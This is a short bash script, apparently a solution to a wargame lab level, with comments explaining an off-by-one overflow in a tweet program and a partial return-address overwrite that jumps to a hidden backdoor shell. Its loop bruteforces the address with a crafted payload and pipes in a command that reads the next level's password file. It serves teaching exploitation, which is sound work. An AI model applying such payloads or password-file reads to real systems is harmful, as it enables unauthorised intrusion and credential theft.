#!/bin/bash


#   Observations: there is a secret_backdoor() function at offset 0x0000072b which
# will call system to execute "/bin/bash"

#   Exploitation: there is a bug in the function set_username(). When the
# program asks for a username, it reads up to 0x80 bytes and then copies up to
# 0x29 bytes from the input string into the tweet structure.
# This structure happens to have 0x28 bytes allocated for the username, so the
# 0x29'th byte copied will be overwriting the next field, the message length.
# This will let us control the length of the message to write and smash the stack
# to overwrite the return address.

# PIE is enabled, so we can partially overwrite the return address of handle_tweet()
# with the offset of secret_backdoor(). There is a little problem, we know what the last
# 3 nibbles will be (0x72b), but we can't write a separate nibble to memmory. This is why
# we will have to bruteforce the 12-15 bits.

# The begining of the buffer is 0xc4 bytes from the return address so we will have to
# overwrite the message length field with, at least, \xc6 (0xc4 + 2 last bytes of the ret
# addr)

# Since we will have to bruteforce a single nibble, there is going to be a chance of 1 in 16
# runs to retreive the flag, therefore it shouldn't take too much time to bruteforce the address.

echo "[+] Bruteforcing secret_backdoor() address..."
while :
do
    (python -c 'print "A"*0x28 + "\xc6\n" + "B"*0xc4 + "\x2b\x07"'; echo "cat /home/lab6B/.pass";) \
        | /levels/lab06/lab6C | grep -E "[0-9a-zA-z_\-]+" && break
done

